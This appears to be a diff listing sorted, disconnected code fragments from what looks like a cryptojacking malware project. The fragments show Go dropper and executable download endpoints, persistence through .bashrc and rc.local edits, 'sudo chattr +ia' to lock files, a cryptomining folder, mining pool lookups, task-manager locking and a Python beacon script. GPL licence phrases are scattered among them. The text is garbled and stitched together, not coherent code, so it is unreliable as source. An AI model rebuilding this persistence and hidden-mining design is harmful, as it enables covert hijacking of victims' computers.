@@ -1,0 +1,227 @@
+"("" """
+"(""'"", """""
+"(""*"""
+"("".bashrc"""
+"(""/dropper/download"", app.GetDropperController.Get"
+"(""/etc/machine-id"", ""r"""
+"(""/executable/IsAlive"", app.IsAliveController.Check"
+"(""/executable/connect"", app.ConnectController.Connect"
+"(""/executable/download"", app.GetExecutableController.Get"
+"(""0.0.0.0:%v"", 3001"
+"(""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/""[((val<<8"
+"(""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/""[(val>>valb"
+"(""Couldnt read terminal output"""
+"(""DB_HOSTNAME"", """""
+"(""DB_NAME"", """""
+"(""DB_PASSWORD"", """""
+"(""DB_PORT"", """""
+"(""DB_USERNAME"", """""
+"(""Erro no POST"""
+"(""POST error"""
+"(""Setting chattr in all files"""
+"(""[+] Chattr setted!"""
+"(""[+] Cryptomining folder created!"""
+"(""[-] Chattr error!"""
+"(""[-] Couldn't Get pool info, server possible be offline or no internet connection."""
+"(""[-] Persistence failed"""
+"(""\"" >> """
+"(""\nMSG [{}]"".format(post_data"
+"(""b'"", ''"
+"(""communication.py"", ""w+"""
+"(""eae men"""
+"(""error building the app"""
+"(""error logging into DB: %v"", err"
+"(""error occurred: %v"", err"
+"(""error querying: %v"", err"
+"(""error trying to open db connection: %v"", err"
+"(""incorrect input format: %v"", err"
+"(""mining_pool_info_file.txt"", ""r"""
+"(""postgres"", psqlconn"
+"(""sudo chattr +ia file"""
+"(""unable to read file: %v"", err"
+"('', port"
+"('Content-type', 'text/html'"
+"() (*sql.DB, error"
+"() (App, error"
+"() (string, error"
+"(256,-1"
+"(arq, 'w'"
+"(comando,""r"""
+"(comando2 = std::string(""echo \"""""
+"(comando3 = std::string(""echo \"""""
+"(commands = std::string(""sudo chattr +ia """
+"(compiler, kernel, and so on"
+"(executable_path, ""rb"""
+"(f, ""%s"", id"
+"(f, ""%s"", pool->id"
+"(f, ""%s"", pool->pool"
+"(f, ""%s"", script"
+"(fgets( line, 256, fpipe"
+"(fmt.Sprintf(""invalid database port config: %s"", port"
+"(home, ""/"""
+"(home, pw->pw_dir"
+"(http.StatusBadRequest, ""err"""
+"(http.StatusOK, """""
+"(http.StatusOK, response"
+"(implies Linux, so it must come first"
+"(int argc, char * argv[]"
+"(ip, time"
+"(key, defaultValue string"
+"(linux, windows, macOs ..."
+"(miner_path, 0700"
+"(output, 0, MAX_TERMINAL_OUTPUT"
+"(output, NULL, 10"
+"(output, line"
+"(q, input"
+"(rc_local, ""r"""
+"(rc_local, ""w"""
+"(server_address, handler_class"
+"(server_class=HTTPServer, handler_class=S, port=80"
+"(stat(miner_path, &st"
+"(string, error"
+"(x = std::string(""."""
+"(x = std::string(""cp """
+"(x = std::string(""python3 communication.py post """
+"(x = std::string(""rm """
+(!(fpipe = (FILE*
+(!lock_taskmanager
+(&payload
+('='
+((sizeof(char
+() ((PLATFORM_NAME == NULL
+(-1
+(-2
+(0
+(1
+(2
+(200
+(32
+(BSD
+(BaseHTTPRequestHandler
+(C
+(CC
+(Cygwin POSIX under Microsoft Window
+(Darwin
+(Debian 6.3.0-18+deb9u1
+(OUTPUT
+(RM
+(THREAD
+(T[c] == -1
+(Tasks::check_task_manager
+(Tasks::lock_task_manager
+(VERSION
+(WORK IN PROGRESS
+(_AIX
+(_WIN32
+(_WIN64
+(__ANDROID__
+(__APPLE__
+(__CYGWIN__
+(__MACH__
+(__SVR4
+(__hpux
+(__linux__
+(__sun
+(__unix__
+(a
+(addr
+(argv
+(argv[1] == 'get_pool'
+(argv[1] == 'post'
+(argv[2]
+(at your option
+(bashrc_path
+(c *gin.Context
+(caminho = std::string(get_home_enviroment(
+(char *
+(char c : in
+(char((val>>valb
+(char*
+(command
+(command2
+(command3
+(configVariables.ExecutablePath
+(const std::string &in
+(const std::string&
+(const std::string& s
+(content_length
+(controller ConnectController
+(controller GetDropperController
+(controller GetExecutableController
+(controller IsAliveController
+(controller.Payload.Bytes
+(create_cryptomining_folder(
+(cryptography
+(db Database
+(db database.IDatabase
+(dropper/executable
+(dropperBinary
+(executable_name
+(executable_path
+(f
+(f == NULL
+(fpipe
+(g
+(get_pool
+(getuid(
+(id
+(if you work as a programmer
+(independent of having been made by running the Program
+(input
+(input any
+(int i=0; i<64; i++
+(is_root(
+(key
+(len(argv
+(linux
+(middlewares.LoggerMiddleware(app.Database
+(miner_path
+(msg
+(name
+(not limited to patent issues
+(or with a work based on the Program
+(out.size(
+(path
+(path string
+(payload
+(pid == 0
+(pool
+(pool->id
+(pool->pool
+(pool_info
+(pool_info*
+(port
+(port=int(argv[1]
+(post_data
+(pw->pw_dir
+(q
+(r.data
+(rc_local
+(req
+(ret != 0
+(ret == 0
+(root
+(s string
+(self
+(self.headers['Content-Length']
+(self.send_pool_info(
+(send
+(sizeof(char
+(sizeof(pool_info
+(std::string s : programs
+(str(List[0]
+(str(List[1]
+(str(req
+(strings.TrimSpace(s
+(true
+(uid == NO_UID && 0? NULL: getpwuid(uid
+(url
+(useCase GetDropperUseCase
+(val<<6
+(val<<8
+(valb+8
+(valb>-6
+(valb>=0
+(value
+(which makes passes at compilers
+(windows
